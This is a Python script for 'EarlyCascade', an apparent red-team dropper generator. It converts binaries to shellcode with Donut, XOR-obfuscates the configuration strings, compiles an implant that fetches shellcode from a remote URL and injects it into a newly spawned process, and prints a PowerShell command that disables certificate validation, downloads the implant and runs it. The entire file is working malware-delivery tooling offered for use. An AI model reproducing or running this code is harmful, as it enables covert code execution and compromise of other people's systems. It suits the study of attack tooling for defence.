import sys, getopt
import os
import stat
import random
import string
import subprocess
from urllib.parse import urlparse
from pathlib import Path


def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str


def printCiphertext(ciphertext):
	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'


def getHelpExploration():
        helpMessage = """
EarlyCascade - Dropper Generator with Shellcode Injection

Description:
  EarlyCascade generates a dropper that injects shellcode into a newly created process. 
  The shellcode can be generated from a binary using Donut or provided directly as a raw shellcode file.

Usage:
  Dropper EarlyCascade listenerDownload listenerBeacon -p <process>

Options:
  -p, --process             Target process to create and inject into (e.g., notepad.exe)
"""

        return helpMessage


def generatePayloadsExploration(binary, binaryArgs, rawShellCode, url, aditionalArgs):

        binary_, binaryArgs_, rawShellCode_, process, url_, targetHost = parseCmdLine(aditionalArgs)

        droppersPath, shellcodesPath, cmdToRun = generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)

        return droppersPath, shellcodesPath, cmdToRun


def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost):
        
        if url[-1:] == "/":
                url = url[:-1]

        print('[+] Parse url:')
        parsed_url = urlparse(url)
        schema = parsed_url.scheme
        ip = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (443 if schema == "https" else 80)
        shellcodeFile = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
        fullLocation = parsed_url.path + "/" + shellcodeFile

        print(" Schema:", schema)
        print(" IP Address:", ip)
        print(" Port:", port)
        print(" Full Location:", fullLocation)
        print(" shellcodeFile:", shellcodeFile)
        print(" Process to start:", process)

        print('\n[+] Generate shellcode to fetch with donut:')
        if binary:
                print(' Binary ', binary)
                print(' BinaryArgs ', binaryArgs)
                if os.name == 'nt':
                        donutBinary = os.path.join(Path(__file__).parent, '.\\ressources\\donut.exe')
                        shellcodePath = os.path.join(Path(__file__).parent, '.\\bin\\'+shellcodeFile)
                        try:
                                os.remove(shellcodePath)
                        except OSError as error: 
                                pass
                        args = (donutBinary, '-f', '1', '-b', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, binary)
                else:   
                        donutBinary = os.path.join(Path(__file__).parent, './ressources/donut')
                        shellcodePath = os.path.join(Path(__file__).parent, './bin/'+shellcodeFile)
                        try:
                                os.remove(shellcodePath)
                        except OSError as error: 
                                pass
                        args = (donutBinary, '-f', '1', '-b', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i' , binary)
                        st = os.stat(donutBinary)
                        os.chmod(donutBinary, st.st_mode | stat.S_IEXEC)
                
                popen = subprocess.Popen(args, stdout=subprocess.PIPE)
                popen.wait()
                output = popen.stdout.read()
                print(output.decode("utf-8") )

        elif rawShellCode:
                print('\n[+] Rename shellcode to match url:')

                shellcode = open(rawShellCode, "rb").read()

                shellcodePath = os.path.join(Path(__file__).parent, 'bin', +shellcodeFile)
                f = open(shellcodePath, "wb")
                f.write(shellcode)
                f.close()
                        
        print("\n[+] Compile injector with informations")
        print('generate cryptDef.h with given input ')

        templateFilePath = os.path.join(Path(__file__).parent, 'templateDef')
        template = open(templateFilePath, "r").read()

        if schema=="https":
                template = template.replace("<ISHTTPS>", "true")
        else:
                template = template.replace("<ISHTTPS>", "false")
        template = template.replace("<PROCESS>", process+" ")
        template = template.replace("<DOMAIN>", ip+" ")
        template = template.replace("<URL>", fullLocation+" ")
        template = template.replace("<PORT>", str(port))

        defFilePath = os.path.join(Path(__file__).parent, 'bin', 'clearDef.h')
        f = open(defFilePath, "w")
        f.truncate(0) 
        f.write(template)
        f.close()

        if os.name == 'nt':
                fileEncryptPath = os.path.join(Path(__file__).parent, 'bin', 'cryptDef.h')
                fileEncrypt = open(fileEncryptPath, 'w')
        else:
                fileEncryptPath = os.path.join(Path(__file__).parent, 'bin', 'cryptDef.h')
                fileEncrypt = open(fileEncryptPath, 'w')

        fileClearPath = os.path.join(Path(__file__).parent, 'bin', 'clearDef.h')
        fileClear = open(fileClearPath, 'r')

        Lines = fileClear.readlines()

        characters = string.ascii_letters + string.digits
        password = ''.join(random.choice(characters) for i in range(16))
        KEY_XOR = password.replace('"','-').replace('\'','-')

        XorBlock=False
        # Strips the newline character
        for line in Lines:
                #print(line)

                if(XorBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("XorKey" in words[0]):
                                        words[1]= KEY_XOR
                                        line ='"'.join(words)

                                else:
                                        plaintext=words[1]
                                        ciphertext = xor(plaintext, KEY_XOR)
                                        
                                        words[1]= printCiphertext(ciphertext)
                                        line =''.join(words)

                if(line == "// TO XOR\n"):
                        XorBlock=True;
                
                fileEncrypt.writelines(line)

        fileEncrypt.close()



        print(' compile injector ')
        if os.name == 'nt':
                dropperExePath = os.path.join(Path(__file__).parent, 'bin\\implant.exe')
                try:
                        os.remove(dropperExePath)
                except OSError as error: 
                        pass
                compileScript = os.path.join(Path(__file__).parent, '.\\compile.bat')
                args = compileScript.split()
        else:   
                dropperExePath = os.path.join(Path(__file__).parent, 'bin/implant.exe')
                try:
                        os.remove(dropperExePath)
                except OSError as error: 
                        pass
                compileScript = os.path.join(Path(__file__).parent, './compile.sh')
                args = compileScript.split()

                st = os.stat(compileScript)
                os.chmod(compileScript, st.st_mode | stat.S_IEXEC)
                
        popen = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=Path(__file__).parent)
        popen.wait()

        output = popen.stdout.read()
        print(output.decode("utf-8") )

        print('\n[+] Check generated files')
        if os.name == 'nt':
                dropperExePath = os.path.join(Path(__file__).parent, 'bin\\implant.exe')
                shellcodePath = os.path.join(Path(__file__).parent, 'bin\\'+shellcodeFile)
        else:
                dropperExePath = os.path.join(Path(__file__).parent, 'bin/implant.exe')
                shellcodePath = os.path.join(Path(__file__).parent, 'bin/'+shellcodeFile)

        if not os.path.isfile(dropperExePath):
                print("[-] Error: Dropper file don't exist")
                return [], [], "Error: Dropper file don't exist"
        if not os.path.isfile(shellcodePath):
                print("[-] Error: Shellcode file don't exist")
                return [], [], "Error: Shellcode file don't exist"
        
        print("\n[+] Done")
        
        url = parsed_url.path
        if url:
                if url[0] == "/":
                        url = url[1:]
                url += "/"
                
        cmdToRun  = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('"
        cmdToRun += schema + "://" + ip + ":" + str(port) + "/" + url + "implant.exe"
        cmdToRun += "',(Get-Location).Path+'\\test.exe'); Start-Process test.exe;\n"
        droppersPath = [dropperExePath]
        shellcodesPath = [shellcodePath]

        return droppersPath, shellcodesPath, cmdToRun


helpMessage = """
EarlyCascade - Dropper Generator with Shellcode Injection

Description:
  EarlyCascade generates a dropper that injects shellcode into a newly created process. 
  The shellcode can be generated from a binary using Donut or provided directly as a raw shellcode file.

Usage:
  EarlyCascade.py -p <process> -u <url> -b <binary> -a <args>
  EarlyCascade.py -p <process> -u <url> -r <rawShellcode>

Options:
  -h, --help                Show this help message and exit
  -p, --process             Target process to create and inject into (e.g., notepad.exe)
  -u, --url                 URL where the dropper fetches the shellcode from
  -b, --binary              Path to a PE binary used to generate shellcode via Donut
  -a, --args                Arguments to pass to the binary during shellcode generation
  -r, --rawShellcode        Path to a raw shellcode file (Donut will not be used)
"""


def parseCmdLine(argv):
        
        binary=""
        binaryArgs=""
        rawShellCode=""
        process=""
        url=""
        targetHost=""

        opts, args = getopt.getopt(argv,"hb:a:r:u:p:t:s:d:",["binary=","args=","rawShellcode=","url=","process=","targetHost="])
        for opt, arg in opts:
                if opt == '-h':
                        print (helpMessage)
                        sys.exit()
                elif opt in ("-b", "--binary"):
                        binary = arg
                elif opt in ("-a", "--args"):
                        binaryArgs = arg
                elif opt in ("-r", "--rawShellcode"):
                        rawShellCode = arg
                elif opt in ("-u", "--url"):
                        url = arg
                elif opt in ("-p", "--process"):
                        process = arg
                elif opt in ("-t", "--targetHost"):
                        targetHost = arg

        return binary, binaryArgs, rawShellCode, process, url, targetHost


def main(argv):

        if(len(argv)<2):
                print (helpMessage)
                exit()
        
        binary, binaryArgs, rawShellCode, process, url, targetHost = parseCmdLine(argv)

        droppersPath, shellcodesPath, cmdToRun = generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
        print("\n[+] Dropper path  : ", droppersPath)
        print("[+] Shellcode path: ", shellcodesPath)
        print("[+] Command to run: ", cmdToRun)

        
if __name__ == "__main__":
    main(sys.argv[1:])

